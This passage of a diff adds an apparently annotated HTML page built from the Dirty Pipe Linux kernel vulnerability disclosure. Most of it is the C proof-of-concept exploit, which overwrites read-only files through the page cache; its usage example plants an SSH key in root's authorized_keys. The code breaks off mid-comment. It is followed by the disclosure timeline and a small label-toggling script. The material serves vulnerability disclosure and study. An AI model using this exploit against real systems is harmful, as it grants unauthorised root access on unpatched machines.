+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+
+#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
+
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 4096
+#endif
+
+/**
+ * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(int p[2])
+{
+	if (pipe(p)) abort();
+
+	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+	static char buffer[4096];
+
+	/* fill the pipe completely; each pipe_buffer will now have
+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
+	for (unsigned r = pipe_size; r &gt; 0;) {
+		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+		write(p[1], buffer, n);
+		r -= n;
+	}
+
+	/* drain the pipe, freeing all pipe_buffer instances (but
+	   leaving the flags initialized) */
+	for (unsigned r = pipe_size; r &gt; 0;) {
+		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+		read(p[0], buffer, n);
+		r -= n;
+	}
+
+	/* the pipe is now empty, and if somebody adds a new
+	   pipe_buffer without initializing its &quot;flags&quot;, the buffer
+	   will be mergeable */
+}
+
+int main(int argc, char **argv)
+{
+	if (argc != 4) {
+		fprintf(stderr, &quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;, argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	/* dumb command-line argument parser */
+	const char *const path = argv[1];
+	loff_t offset = strtoul(argv[2], NULL, 0);
+	const char *const data = argv[3];
+	const size_t data_size = strlen(data);
+
+	if (offset % PAGE_SIZE == 0) {
+		fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
+	const loff_t end_offset = offset + (loff_t)data_size;
+	if (end_offset &gt; next_page) {
+		fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	/* open the input file and validate the specified offset */
+	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
+	if (fd &lt; 0) {
+		perror(&quot;open failed&quot;);
+		return EXIT_FAILURE;
+	}
+
+	struct stat st;
+	if (fstat(fd, &amp;st)) {
+		perror(&quot;stat failed&quot;);
+		return EXIT_FAILURE;
+	}
+
+	if (offset &gt; st.st_size) {
+		fprintf(stderr, &quot;Offset is not inside the file\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	if (end_offset &gt; st.st_size) {
+		fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	/* create the pipe with all flags initialized with
+	   PIPE_BUF_FLAG_CAN_MERGE */
+	int p[2];
+	prepare_pipe(p);
+
+	/* splice one byte from before the specified offset into the
+	   pipe; this will add a reference to the page cache, but
+	   since copy_page_to_iter_pipe() does not initialize the
+	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */
+	--offset;
+	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);
+	if (nbytes &lt; 0) {
+		perror(&quot;splice failed&quot;);
+		return EXIT_FAILURE;
+	}
+	if (nbytes == 0) {
+		fprintf(stderr, &quot;short splice\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	/* the following write will not create </pre></div>
+<div class="span heading" data-lab="patch" style="border-left-color:#15803d"><span class=idx>#76 · heading</span><span class=lab style="color:#15803d">patch</span><p><b>### Timeline</b></p></div>
+<div class="span prose" data-lab="patch" style="border-left-color:#15803d"><span class=idx>#77 · prose</span><span class=lab style="color:#15803d">patch</span><p>* 2021-04-29: first support ticket about file corruption
+* 2022-02-19: file corruption problem identified as Linux kernel bug, which turned out to be an exploitable vulnerability
+* 2022-02-20: bug report, exploit and patch sent to the Linux kernel security team
+* 2022-02-21: bug reproduced on Google Pixel 6; bug report sent to the Android Security Team
+* 2022-02-21: patch sent to LKML (without vulnerability details) as suggested by Linus Torvalds, Willy Tarreau and Al Viro
+* 2022-02-23: Linux stable releases with bug fix (5.16.11, 5.15.25, 5.10.102)
+* 2022-02-24: Google merges bug fix into the Android kernel
+* 2022-02-28: notified the linux-distros mailing list
+* 2022-03-07: public disclosure</p></div>
+<script>
+const off = new Set();
+document.querySelectorAll('.legend b').forEach(b => b.onclick = () => {
+  const l = b.dataset.lab; off.has(l) ? off.delete(l) : off.add(l); b.classList.toggle('off', off.has(l)); apply(); });
+const hc = document.getElementById('hidecode');
+hc.onchange = apply;
+function apply(){ document.querySelectorAll('.span').forEach(s => {
+  s.classList.toggle('hide', off.has(s.dataset.lab) || (hc.checked && s.classList.contains('code'))); }); }
+</script>
